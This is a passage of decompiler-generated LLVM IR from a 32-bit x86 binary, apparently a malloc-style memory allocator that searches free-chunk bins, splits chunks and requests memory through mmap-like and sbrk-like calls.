  %v0_80520bf = load i32, i32* %eax.global-to-local, align 4
  %v1_80520bf = load i32, i32* @edx, align 4
  %v2_80520bf = add i32 %v1_80520bf, 4
  %v3_80520bf = inttoptr i32 %v2_80520bf to i32*
  store i32 %v0_80520bf, i32* %v3_80520bf, align 4
  %v0_80520c2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80520c2 = load i32, i32* @edx, align 4
  %v3_80520c2 = add i32 %v1_80520c2, %v0_80520c2
  %v4_80520c2 = inttoptr i32 %v3_80520c2 to i32*
  store i32 %v0_80520c2, i32* %v4_80520c2, align 4
  br label %dec_label_pc_8052596

dec_label_pc_80520cc:                             ; preds = %dec_label_pc_8052060, %dec_label_pc_8052050
  %v4_8052077 = phi i32 [ %storemerge1.pre, %dec_label_pc_8052050 ], [ %v3_8052063, %dec_label_pc_8052060 ]
  store i32 %v4_8052077, i32* %eax.global-to-local, align 4
  %v12_80520cc = icmp eq i32 %v4_8052077, %v2_8052054
  %v1_80520ce = icmp eq i1 %v12_80520cc, false
  br i1 %v1_80520ce, label %dec_label_pc_8052060, label %dec_label_pc_80520d0

dec_label_pc_80520d0:                             ; preds = %dec_label_pc_80520cc, %dec_label_pc_8052042
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80520d9 = add i32 %stack_var_-40.0.ph, 1
  %v2_80520dc = udiv i32 %v1_80520d9, 32
  store i32 %v2_80520dc, i32* @edi, align 4
  %v1_80520df = mul i32 %v1_80520d9, 8
  %v2_80520df = add i32 %v1_80520df, ptrtoint (i32* @global_var_80558ec.34 to i32)
  store i32 %v2_80520df, i32* %ebx.global-to-local, align 4
  %v1_80520e6 = urem i32 %v1_80520d9, 32
  %v2_80520e6 = icmp eq i32 %v1_80520e6, 0
  store i32 %v1_80520e6, i32* %ecx.global-to-local, align 4
  %v1_80520e9 = mul nuw nsw i32 %v2_80520dc, 4
  %v2_80520e9 = add i32 %v1_80520e9, ptrtoint (i32* @global_var_8055bf4.38 to i32)
  %v3_80520e9 = inttoptr i32 %v2_80520e9 to i32*
  %v4_80520e9 = load i32, i32* %v3_80520e9, align 4
  store i32 %v4_80520e9, i32* %edx.global-to-local, align 4
  br i1 %v2_80520e6, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_80520d0
  %v5_80520f0 = shl i32 1, %v1_80520e6
  store i32 %v5_80520f0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80520d0, %bb88, %dec_label_pc_8052131
  %v1_80520f2 = phi i32 [ %v1_80520f2.pre, %dec_label_pc_8052131 ], [ %v4_80520e9, %bb88 ], [ %v4_80520e9, %dec_label_pc_80520d0 ]
  %v0_80520f6 = phi i32 [ %v0_80520f2.pre, %dec_label_pc_8052131 ], [ %v5_80520f0, %bb88 ], [ 1, %dec_label_pc_80520d0 ]
  %tmp89 = icmp ule i32 %v0_80520f6, %v1_80520f2
  %v1_80520f6 = icmp eq i32 %v0_80520f6, 0
  %v1_80520f8 = icmp eq i1 %v1_80520f6, false
  %or.cond = and i1 %tmp89, %v1_80520f8
  br i1 %or.cond, label %dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge, label %dec_label_pc_80520fa.preheader

dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge: ; preds = %.preheader
  %v0_80521217.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052126.preheader

dec_label_pc_80520fa.preheader:                   ; preds = %.preheader
  %v0_80520fa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80520fa

dec_label_pc_80520fa:                             ; preds = %dec_label_pc_80520fa.preheader, %dec_label_pc_8052104
  %v0_80520fa = phi i32 [ %v0_80520fa.pre, %dec_label_pc_80520fa.preheader ], [ %v1_80520fa, %dec_label_pc_8052104 ]
  %v1_80520fa = add i32 %v0_80520fa, 1
  store i32 %v1_80520fa, i32* @edi, align 4
  %v6_80520fe = icmp ugt i32 %v1_80520fa, 2
  br i1 %v6_80520fe, label %dec_label_pc_80521ad, label %dec_label_pc_8052104

dec_label_pc_8052104:                             ; preds = %dec_label_pc_80520fa
  %v1_8052104 = mul i32 %v1_80520fa, 4
  %v2_8052104 = add i32 %v1_8052104, ptrtoint (i32* @global_var_8055bf4.38 to i32)
  %v3_8052104 = inttoptr i32 %v2_8052104 to i32*
  %v4_8052104 = load i32, i32* %v3_8052104, align 4
  store i32 %v4_8052104, i32* %edx.global-to-local, align 4
  %v1_805210b = icmp eq i32 %v4_8052104, 0
  br i1 %v1_805210b, label %dec_label_pc_80520fa, label %dec_label_pc_805210f

dec_label_pc_805210f:                             ; preds = %dec_label_pc_8052104
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052116 = mul i32 %v1_80520fa, 256
  store i32 %v2_8052116, i32* %eax.global-to-local, align 4
  %v1_8052119 = add i32 %v2_8052116, ptrtoint (i32* @global_var_80558ec.34 to i32)
  store i32 %v1_8052119, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052126.preheader

dec_label_pc_8052126.preheader:                   ; preds = %dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge, %dec_label_pc_805210f
  %v0_80521217 = phi i32 [ %v1_8052119, %dec_label_pc_805210f ], [ %v0_80521217.pre, %dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805210f ], [ %v0_80520f6, %dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge ]
  %v0_8052138 = phi i32 [ %v4_8052104, %dec_label_pc_805210f ], [ %v1_80520f2, %dec_label_pc_80520f6.dec_label_pc_8052126.preheader_crit_edge ]
  %v2_80521264 = and i32 %v0_8052138, %esi.promoted
  %v3_80521265 = icmp eq i32 %v2_80521264, 0
  br i1 %v3_80521265, label %dec_label_pc_8052121, label %dec_label_pc_805212a

dec_label_pc_8052121:                             ; preds = %dec_label_pc_8052126.preheader, %dec_label_pc_8052121
  %v2_805212418 = phi i32 [ %v2_8052124, %dec_label_pc_8052121 ], [ %esi.promoted, %dec_label_pc_8052126.preheader ]
  %v0_80521218 = phi i32 [ %v1_8052121, %dec_label_pc_8052121 ], [ %v0_80521217, %dec_label_pc_8052126.preheader ]
  %v1_8052121 = add i32 %v0_80521218, 8
  %v2_8052124 = mul i32 %v2_805212418, 2
  %v2_8052126 = and i32 %v2_8052124, %v0_8052138
  %v3_8052126 = icmp eq i32 %v2_8052126, 0
  br i1 %v3_8052126, label %dec_label_pc_8052121, label %dec_label_pc_8052126.dec_label_pc_805212a_crit_edge

dec_label_pc_8052126.dec_label_pc_805212a_crit_edge: ; preds = %dec_label_pc_8052121
  store i32 %v1_8052121, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052124, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805212a

dec_label_pc_805212a:                             ; preds = %dec_label_pc_8052126.dec_label_pc_805212a_crit_edge, %dec_label_pc_8052126.preheader
  %v0_805213a = phi i32 [ %v2_8052124, %dec_label_pc_8052126.dec_label_pc_805212a_crit_edge ], [ %esi.promoted, %dec_label_pc_8052126.preheader ]
  %v1_8052154 = phi i32 [ %v1_8052121, %dec_label_pc_8052126.dec_label_pc_805212a_crit_edge ], [ %v0_80521217, %dec_label_pc_8052126.preheader ]
  %v1_805212a = add i32 %v1_8052154, 12
  %v2_805212a = inttoptr i32 %v1_805212a to i32*
  %v3_805212a = load i32, i32* %v2_805212a, align 4
  store i32 %v3_805212a, i32* %ecx.global-to-local, align 4
  %v12_805212d = icmp eq i32 %v3_805212a, %v1_8052154
  %v1_805212f = icmp eq i1 %v12_805212d, false
  br i1 %v1_805212f, label %dec_label_pc_8052145, label %dec_label_pc_8052131

dec_label_pc_8052131:                             ; preds = %dec_label_pc_805212a
  %v1_8052133 = add i32 %v3_805212a, 8
  store i32 %v1_8052133, i32* %ebx.global-to-local, align 4
  %v1_8052136 = sub i32 -1, %v0_805213a
  store i32 %v1_8052136, i32* %eax.global-to-local, align 4
  %v2_8052138 = and i32 %v0_8052138, %v1_8052136
  store i32 %v2_8052138, i32* %edx.global-to-local, align 4
  %v2_805213a = mul i32 %v0_805213a, 2
  store i32 %v2_805213a, i32* %esi.global-to-local, align 4
  %v1_805213c = load i32, i32* @edi, align 4
  %v2_805213c = mul i32 %v1_805213c, 4
  %v3_805213c = add i32 %v2_805213c, ptrtoint (i32* @global_var_8055bf4.38 to i32)
  %v4_805213c = inttoptr i32 %v3_805213c to i32*
  store i32 %v2_8052138, i32* %v4_805213c, align 4
  %v0_80520f2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80520f2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052145:                             ; preds = %dec_label_pc_805212a
  %v1_8052145 = add i32 %v3_805212a, 4
  %v2_8052145 = inttoptr i32 %v1_8052145 to i32*
  %v3_8052145 = load i32, i32* %v2_8052145, align 4
  store i32 %v3_8052145, i32* %edx.global-to-local, align 4
  %v1_8052148 = add i32 %v3_805212a, 12
  %v2_8052148 = inttoptr i32 %v1_8052148 to i32*
  %v3_8052148 = load i32, i32* %v2_8052148, align 4
  store i32 %v3_8052148, i32* %eax.global-to-local, align 4
  %v1_805214b = and i32 %v3_8052145, -4
  store i32 %v1_805214b, i32* @edx, align 4
  %v5_8052150 = sub i32 %v1_805214b, %.v1_8051ea3
  store i32 %v5_8052150, i32* %esi.global-to-local, align 4
  store i32 %v3_8052148, i32* %v2_805212a, align 4
  %v0_8052157 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052157 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052157 = add i32 %v1_8052157, 8
  %v3_8052157 = inttoptr i32 %v2_8052157 to i32*
  store i32 %v0_8052157, i32* %v3_8052157, align 4
  %v0_805215a = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_805215a, 16
  br i1 %tmp126, label %dec_label_pc_805215f, label %dec_label_pc_8052166

dec_label_pc_805215f:                             ; preds = %dec_label_pc_8052145
  %v0_805215f = load i32, i32* %ecx.global-to-local, align 4
  %v1_805215f = load i32, i32* @edx, align 4
  %v2_805215f = add i32 %v0_805215f, 4
  %v3_805215f = add i32 %v2_805215f, %v1_805215f
  %v4_805215f = inttoptr i32 %v3_805215f to i32*
  %v5_805215f = load i32, i32* %v4_805215f, align 4
  %v6_805215f = or i32 %v5_805215f, 1
  store i32 %v6_805215f, i32* %v4_805215f, align 4
  br label %dec_label_pc_80521a5

dec_label_pc_8052166:                             ; preds = %dec_label_pc_8052145
  store i32 %.v1_8051ea3, i32* %eax.global-to-local, align 4
  %v0_805216f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805216f = add i32 %v0_805216f, %.v1_8051ea3
  store i32 %v2_805216f, i32* @edx, align 4
  %v1_8052172 = load i32, i32* @ebp, align 4
  %v2_8052172 = add i32 %v1_8052172, 8
  %v3_8052172 = inttoptr i32 %v2_8052172 to i32*
  store i32 %v2_805216f, i32* %v3_8052172, align 4
  %v0_8052175 = load i32, i32* @edx, align 4
  %v1_8052175 = load i32, i32* @ebp, align 4
  %v2_8052175 = add i32 %v1_8052175, 12
  %v3_8052175 = inttoptr i32 %v2_8052175 to i32*
  store i32 %v0_8052175, i32* %v3_8052175, align 4
  %v0_8052178 = load i32, i32* @edx, align 4
  %v1_8052178 = add i32 %v0_8052178, 8
  %v2_8052178 = inttoptr i32 %v1_8052178 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_8052178, align 4
  %v0_805217f = load i32, i32* @edx, align 4
  %v1_805217f = add i32 %v0_805217f, 12
  %v2_805217f = inttoptr i32 %v1_805217f to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_805217f, align 4
  br i1 %v6_8051efb, label %dec_label_pc_805218e, label %dec_label_pc_8052188

dec_label_pc_8052188:                             ; preds = %dec_label_pc_8052166
  %v0_8052188 = load i32, i32* @edx, align 4
  store i32 %v0_8052188, i32* @global_var_80558f0.35, align 16
  br label %dec_label_pc_805218e

dec_label_pc_805218e:                             ; preds = %dec_label_pc_8052166, %dec_label_pc_8052188
  %v4_805218e = or i32 %.v1_8051ea3, 1
  %v0_8052193 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805218e, i32* %ebx.global-to-local, align 4
  %v1_8052199 = or i32 %v0_8052193, 1
  store i32 %v1_8052199, i32* %eax.global-to-local, align 4
  %v1_805219c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805219c = add i32 %v1_805219c, 4
  %v3_805219c = inttoptr i32 %v2_805219c to i32*
  store i32 %v4_805218e, i32* %v3_805219c, align 4
  %v0_805219f = load i32, i32* %esi.global-to-local, align 4
  %v1_805219f = load i32, i32* @edx, align 4
  %v3_805219f = add i32 %v1_805219f, %v0_805219f
  %v4_805219f = inttoptr i32 %v3_805219f to i32*
  store i32 %v0_805219f, i32* %v4_805219f, align 4
  %v0_80521a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80521a2 = load i32, i32* @edx, align 4
  %v2_80521a2 = add i32 %v1_80521a2, 4
  %v3_80521a2 = inttoptr i32 %v2_80521a2 to i32*
  store i32 %v0_80521a2, i32* %v3_80521a2, align 4
  br label %dec_label_pc_80521a5

dec_label_pc_80521a5:                             ; preds = %dec_label_pc_805215f, %dec_label_pc_805218e
  %v0_80521a5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80521a5 = add i32 %v0_80521a5, 8
  store i32 %v1_80521a5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_80521ad:                             ; preds = %dec_label_pc_80520fa, %dec_label_pc_8051eb5, %dec_label_pc_8051ebd
  %v0_80521ad = load i32, i32* @global_var_80558ec.34, align 4
  store i32 %v0_80521ad, i32* @ebx, align 4
  %v1_80521b7 = add i32 %.v1_8051ea3, 16
  store i32 %v1_80521b7, i32* @esi, align 4
  %v1_80521ba = add i32 %v0_80521ad, 4
  %v2_80521ba = inttoptr i32 %v1_80521ba to i32*
  %v3_80521ba = load i32, i32* %v2_80521ba, align 4
  %v1_80521c1 = and i32 %v3_80521ba, -4
  store i32 %v1_80521c1, i32* %ecx.global-to-local, align 4
  %v7_80521c4 = icmp ult i32 %v1_80521c1, %v1_80521b7
  br i1 %v7_80521c4, label %dec_label_pc_80521e4, label %dec_label_pc_80521c8

dec_label_pc_80521c8:                             ; preds = %dec_label_pc_80521ad
  %v2_80521cc = add i32 %v0_80521ad, %.v1_8051ea3
  store i32 %v2_80521cc, i32* @edx, align 4
  %v1_80521cf = or i32 %.v1_8051ea3, 1
  store i32 %v1_80521cf, i32* %eax.global-to-local, align 4
  store i32 %v2_80521cc, i32* @global_var_80558ec.34, align 4
  store i32 %v1_80521cf, i32* %v2_80521ba, align 4
  %v0_80521db = load i32, i32* %ecx.global-to-local, align 4
  %v5_80521db = sub i32 %v0_80521db, %.v1_8051ea3
  store i32 %v5_80521db, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052537

dec_label_pc_80521e4:                             ; preds = %dec_label_pc_80521ad
  %v0_80521e4 = load i32, i32* @global_var_8055c1c.39, align 4
  store i32 %v0_80521e4, i32* %edx.global-to-local, align 4
  %v0_80521ea = load i8, i8* @global_var_80558c0.33, align 64
  %v1_80521ea = and i8 %v0_80521ea, 2
  %v2_80521ea = icmp eq i8 %v1_80521ea, 0
  br i1 %v2_80521ea, label %dec_label_pc_8052218, label %dec_label_pc_80521f3

dec_label_pc_80521f3:                             ; preds = %dec_label_pc_80521e4
  store i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_80521fb = call i32 @function_8052a6b(i32* bitcast (i8* @global_var_80558c0.33 to i32*))
  store i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32* @ebx, align 4
  %v1_8052205 = add i32 %.v1_8051ea3, -7
  store i32 %v1_8052205, i32* %eax.global-to-local, align 4
  store i32 %v1_8052205, i32* %stack_var_-92, align 4
  %v1_8052209 = call i32 @function_8051e4e(i32 %v1_8052205)
  store i32 %v1_8052209, i32* %eax.global-to-local, align 4
  store i32 %v1_8052209, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_8052218:                             ; preds = %dec_label_pc_80521e4
  %v1_8052218 = add i32 %v0_80521e4, -1
  store i32 %v1_8052218, i32* @ecx, align 4
  store i32 %.v1_8051ea3, i32* @ebx, align 4
  %v1_8052223 = load i32, i32* @global_var_8055c0c.40, align 4
  %v7_8052223 = icmp ult i32 %.v1_8051ea3, %v1_8052223
  br i1 %v7_8052223, label %dec_label_pc_80522e5, label %dec_label_pc_805222f

dec_label_pc_805222f:                             ; preds = %dec_label_pc_8052218
  %v0_805222f = load i32, i32* @global_var_8055c10.41, align 16
  store i32 %v0_805222f, i32* %eax.global-to-local, align 4
  %v1_8052234 = load i32, i32* @global_var_8055c14.42, align 4
  %v5_805223a = icmp slt i32 %v0_805222f, %v1_8052234
  br i1 %v5_805223a, label %dec_label_pc_8052240, label %dec_label_pc_80522e5

dec_label_pc_8052240:                             ; preds = %dec_label_pc_805222f
  %v2_8052242 = add i32 %.v1_8051ea3, 10
  %v3_8052242 = add i32 %v2_8052242, %v0_80521e4
  %v1_8052246 = sub i32 0, %v0_80521e4
  store i32 %v1_8052246, i32* %eax.global-to-local, align 4
  %v2_8052248 = and i32 %v3_8052242, %v1_8052246
  store i32 %v2_8052248, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8052248, %.v1_8051ea3
  br i1 %tmp127, label %dec_label_pc_8052254, label %dec_label_pc_80522e5

dec_label_pc_8052254:                             ; preds = %dec_label_pc_8052240
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052261 = call i32 @function_8053690(i32 0, i32 %v2_8052248, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052218, i32 %v1_8052218)
  store i32 %v8_8052261, i32* %eax.global-to-local, align 4
  store i32 %v8_8052261, i32* @edx, align 4
  %v10_805226b = icmp eq i32 %v8_8052261, -1
  br i1 %v10_805226b, label %dec_label_pc_8052254.dec_label_pc_80522e5_crit_edge, label %dec_label_pc_8052270

dec_label_pc_8052254.dec_label_pc_80522e5_crit_edge: ; preds = %dec_label_pc_8052254
  %v0_80522e5.pre = load i32, i32* @global_var_80558ec.34, align 4
  br label %dec_label_pc_80522e5

dec_label_pc_8052270:                             ; preds = %dec_label_pc_8052254
  %v1_8052272 = urem i32 %v8_8052261, 8
  %v2_8052272 = icmp eq i32 %v1_8052272, 0
  store i32 %v1_8052272, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052272, label %dec_label_pc_805228a, label %dec_label_pc_8052277

dec_label_pc_8052277:                             ; preds = %dec_label_pc_8052270
  %v0_805227c = load i32, i32* @ebx, align 4
  %v2_805227e = sub nsw i32 8, %v1_8052272
  store i32 %v2_805227e, i32* %eax.global-to-local, align 4
  %v2_8052280 = add i32 %v2_805227e, %v8_8052261
  store i32 %v2_8052280, i32* @edx, align 4
  %v2_8052282 = sub i32 %v0_805227c, %v2_805227e
  store i32 %v2_8052282, i32* %esi.global-to-local, align 4
  %v2_8052284 = inttoptr i32 %v2_8052280 to i32*
  store i32 %v2_805227e, i32* %v2_8052284, align 4
  br label %dec_label_pc_8052292

dec_label_pc_805228a:                             ; preds = %dec_label_pc_8052270
  %v1_805228a = inttoptr i32 %v8_8052261 to i32*
  store i32 0, i32* %v1_805228a, align 4
  br label %dec_label_pc_8052292

dec_label_pc_8052292:                             ; preds = %dec_label_pc_8052277, %dec_label_pc_805228a
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052277 ], [ @ebx, %dec_label_pc_805228a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052292 = or i32 %storemerge, 2
  %v1_8052295 = load i32, i32* @edx, align 4
  %v2_8052295 = add i32 %v1_8052295, 4
  %v3_8052295 = inttoptr i32 %v2_8052295 to i32*
  store i32 %v1_8052292, i32* %v3_8052295, align 4
  %v0_8052298 = load i32, i32* @global_var_8055c10.41, align 16
  %v1_805229d = add i32 %v0_8052298, 1
  store i32 %v1_805229d, i32* %eax.global-to-local, align 4
  store i32 %v1_805229d, i32* @global_var_8055c10.41, align 16
  %v1_80522a3 = load i32, i32* @global_var_8055c18.43, align 8
  %v7_80522a9 = icmp sgt i32 %v1_805229d, %v1_80522a3
  br i1 %v7_80522a9, label %dec_label_pc_80522ab, label %dec_label_pc_80522b0

dec_label_pc_80522ab:                             ; preds = %dec_label_pc_8052292
  store i32 %v1_805229d, i32* @global_var_8055c18.43, align 8
  br label %dec_label_pc_80522b0

dec_label_pc_80522b0:                             ; preds = %dec_label_pc_8052292, %dec_label_pc_80522ab
  %v0_80522b0 = load i32, i32* @global_var_8055c24.44, align 4
  %v1_80522b5 = load i32, i32* @ebx, align 4
  %v2_80522b5 = add i32 %v1_80522b5, %v0_80522b0
  store i32 %v2_80522b5, i32* %eax.global-to-local, align 4
  store i32 %v2_80522b5, i32* @global_var_8055c24.44, align 4
  %v1_80522bc = load i32, i32* @global_var_8055c30.45, align 16
  %tmp128 = icmp ugt i32 %v2_80522b5, %v1_80522bc
  br i1 %tmp128, label %dec_label_pc_80522c4, label %dec_label_pc_80522c9

dec_label_pc_80522c4:                             ; preds = %dec_label_pc_80522b0
  store i32 %v2_80522b5, i32* @global_var_8055c30.45, align 16
  br label %dec_label_pc_80522c9

dec_label_pc_80522c9:                             ; preds = %dec_label_pc_80522b0, %dec_label_pc_80522c4
  %v1_80522c9 = load i32, i32* @global_var_8055c28.46, align 8
  %v2_80522c9 = add i32 %v1_80522c9, %v2_80522b5
  store i32 %v2_80522c9, i32* %eax.global-to-local, align 4
  %v1_80522cf = load i32, i32* @global_var_8055c34.47, align 4
  %tmp129 = icmp ugt i32 %v2_80522c9, %v1_80522cf
  br i1 %tmp129, label %dec_label_pc_80522db, label %dec_label_pc_8051f2c

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522c9
  store i32 %v2_80522c9, i32* @global_var_8055c34.47, align 4
  br label %dec_label_pc_8051f2c

dec_label_pc_80522e5:                             ; preds = %dec_label_pc_8052240, %dec_label_pc_8052254.dec_label_pc_80522e5_crit_edge, %dec_label_pc_805222f, %dec_label_pc_8052218
  %v0_80522e5 = phi i32 [ %v0_80522e5.pre, %dec_label_pc_8052254.dec_label_pc_80522e5_crit_edge ], [ %v0_80521ad, %dec_label_pc_805222f ], [ %v0_80521ad, %dec_label_pc_8052240 ], [ %v0_80521ad, %dec_label_pc_8052218 ]
  store i32 %v0_80522e5, i32* %eax.global-to-local, align 4
  %v1_80522ee = add i32 %v0_80522e5, 4
  %v2_80522ee = inttoptr i32 %v1_80522ee to i32*
  %v3_80522ee = load i32, i32* %v2_80522ee, align 4
  %v1_80522f8 = and i32 %v3_80522ee, -4
  %v2_80522f8 = icmp eq i32 %v1_80522f8, 0
  store i32 %v1_80522f8, i32* @ebp, align 4
  %v1_80522fb = load i32, i32* @global_var_8055c08.48, align 8
  %v2_80522fb = add i32 %v1_80522fb, %v1_80521b7
  store i32 %v2_80522fb, i32* %eax.global-to-local, align 4
  %v0_8052301 = load i8, i8* @global_var_8055c20.49, align 32
  %v1_8052301 = urem i8 %v0_8052301, 2
  %v2_8052301 = icmp eq i8 %v1_8052301, 0
  br i1 %v2_8052301, label %dec_label_pc_805230c, label %dec_label_pc_805230a

dec_label_pc_805230a:                             ; preds = %dec_label_pc_80522e5
  %v2_805230a = sub i32 %v2_80522fb, %v1_80522f8
  store i32 %v2_805230a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805230c

dec_label_pc_805230c:                             ; preds = %dec_label_pc_80522e5, %dec_label_pc_805230a
  %v0_8052310 = phi i32 [ %v2_80522fb, %dec_label_pc_80522e5 ], [ %v2_805230a, %dec_label_pc_805230a ]
  %v5_8052310 = add i32 %v0_8052310, %v1_8052218
  store i32 %v5_8052310, i32* %eax.global-to-local, align 4
  %v1_8052314 = sub i32 0, %v0_80521e4
  store i32 %v1_8052314, i32* @edx, align 4
  %v2_805231c = and i32 %v5_8052310, %v1_8052314
  store i32 %v2_805231c, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_805231c, 1
  br i1 %tmp91, label %dec_label_pc_8052336, label %dec_label_pc_8052320

dec_label_pc_8052320:                             ; preds = %dec_label_pc_805230c
  store i32 %v2_805231c, i32* %stack_var_-92, align 4
  %v1_8052324 = call i32 @function_8053b41(i32 %v2_805231c)
  store i32 %v1_8052324, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8052324, i32* @ebx, align 4
  %v10_8052331 = icmp eq i32 %v1_8052324, -1
  %v1_8052334 = icmp eq i1 %v10_8052331, false
  br i1 %v1_8052334, label %dec_label_pc_805238c.dec_label_pc_8052395_crit_edge, label %dec_label_pc_8052320.dec_label_pc_8052336_crit_edge

dec_label_pc_8052320.dec_label_pc_8052336_crit_edge: ; preds = %dec_label_pc_8052320
  %v0_8052336.pre = load i8, i8* @global_var_8055c20.49, align 32
  br label %dec_label_pc_8052336

dec_label_pc_8052336:                             ; preds = %dec_label_pc_8052320.dec_label_pc_8052336_crit_edge, %dec_label_pc_805230c
  %v0_8052362 = phi i32 [ -1, %dec_label_pc_8052320.dec_label_pc_8052336_crit_edge ], [ %v1_8052314, %dec_label_pc_805230c ]
  %v0_8052336 = phi i8 [ %v0_8052336.pre, %dec_label_pc_8052320.dec_label_pc_8052336_crit_edge ], [ %v0_8052301, %dec_label_pc_805230c ]
  %v1_8052336 = urem i8 %v0_8052336, 2
  %v2_8052336 = icmp eq i8 %v1_8052336, 0
  br i1 %v2_8052336, label %dec_label_pc_8052336.dec_label_pc_805234b_crit_edge, label %dec_label_pc_805233f

dec_label_pc_8052336.dec_label_pc_805234b_crit_edge: ; preds = %dec_label_pc_8052336
  %v0_805234b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805234b

dec_label_pc_805233f:                             ; preds = %dec_label_pc_8052336
  %v2_8052343 = add i32 %v1_80522f8, %v1_8052218
  store i32 %v2_8052343, i32* %eax.global-to-local, align 4
  %v0_8052345 = load i32, i32* @esi, align 4
  %v2_8052345 = add i32 %v0_8052345, %v2_8052343
  %v5_8052347 = and i32 %v2_8052345, %v1_8052314
  store i32 %v5_8052347, i32* @esi, align 4
  br label %dec_label_pc_805234b

dec_label_pc_805234b:                             ; preds = %dec_label_pc_8052336.dec_label_pc_805234b_crit_edge, %dec_label_pc_805233f
  %v0_805234b = phi i32 [ %v0_805234b.pre, %dec_label_pc_8052336.dec_label_pc_805234b_crit_edge ], [ %v5_8052347, %dec_label_pc_805233f ]
  %tmp130 = icmp ult i32 %v0_805234b, 1048576
  br i1 %tmp130, label %dec_label_pc_8052353, label %dec_label_pc_8052358

dec_label_pc_8052353:                             ; preds = %dec_label_pc_805234b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8052358

dec_label_pc_8052358:                             ; preds = %dec_label_pc_805234b, %dec_label_pc_8052353
  %v0_805236c = phi i32 [ %v0_805234b, %dec_label_pc_805234b ], [ 1048576, %dec_label_pc_8052353 ]
  %tmp131 = icmp ugt i32 %v0_805236c, %.v1_8051ea3
  br i1 %tmp131, label %dec_label_pc_8052362, label %dec_label_pc_805259a

dec_label_pc_8052362:                             ; preds = %dec_label_pc_8052358
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805236f = call i32 @function_8053690(i32 0, i32 %v0_805236c, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052362, i32 %v0_8052362)
  store i32 %v8_805236f, i32* %eax.global-to-local, align 4
  store i32 %v8_805236f, i32* @ebx, align 4
  %v10_8052379 = icmp eq i32 %v8_805236f, -1
  br i1 %v10_8052379, label %dec_label_pc_805259a, label %dec_label_pc_805238c.thread

dec_label_pc_805238c.thread:                      ; preds = %dec_label_pc_8052362
  %v0_8052382 = load i8, i8* @global_var_8055c20.49, align 1
  %v2_8052382 = and i8 %v0_8052382, -2
  store i8 %v2_8052382, i8* @global_var_8055c20.49, align 32
  %v1_8052389 = load i32, i32* @esi, align 4
  %v2_8052389 = add i32 %v1_8052389, %v8_805236f
  store i32 %v2_8052389, i32* @edx, align 4
  br label %dec_label_pc_8052395

dec_label_pc_805238c.dec_label_pc_8052395_crit_edge: ; preds = %dec_label_pc_8052320
  %v1_8052399.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052395

dec_label_pc_8052395:                             ; preds = %dec_label_pc_805238c.dec_label_pc_8052395_crit_edge, %dec_label_pc_805238c.thread
  %v1_8052399 = phi i32 [ %v1_8052389, %dec_label_pc_805238c.thread ], [ %v1_8052399.pre, %dec_label_pc_805238c.dec_label_pc_8052395_crit_edge ]
  %v0_8052461100 = phi i32 [ %v8_805236f, %dec_label_pc_805238c.thread ], [ %v1_8052324, %dec_label_pc_805238c.dec_label_pc_8052395_crit_edge ]
  %v0_805245399 = phi i32 [ %v2_8052389, %dec_label_pc_805238c.thread ], [ -1, %dec_label_pc_805238c.dec_label_pc_8052395_crit_edge ]
  %v0_8052399 = load i32, i32* @global_var_8055c28.46, align 8
  %v2_8052399 = add i32 %v1_8052399, %v0_8052399
  store i32 %v2_8052399, i32* @global_var_8055c28.46, align 8
  %v2_805239f = add i32 %v1_80522f8, %v0_80522e5
  store i32 %v2_805239f, i32* %ecx.global-to-local, align 4
  %v2_80523a1 = sub i32 %v0_8052461100, %v2_805239f
  %v12_80523a1 = icmp eq i32 %v2_80523a1, 0
  %v10_80523a5 = icmp eq i32 %v0_805245399, -1
  %tmp132 = and i1 %v12_80523a1, %v10_80523a5
  br i1 %tmp132, label %dec_label_pc_80523aa, label %dec_label_pc_80523bc

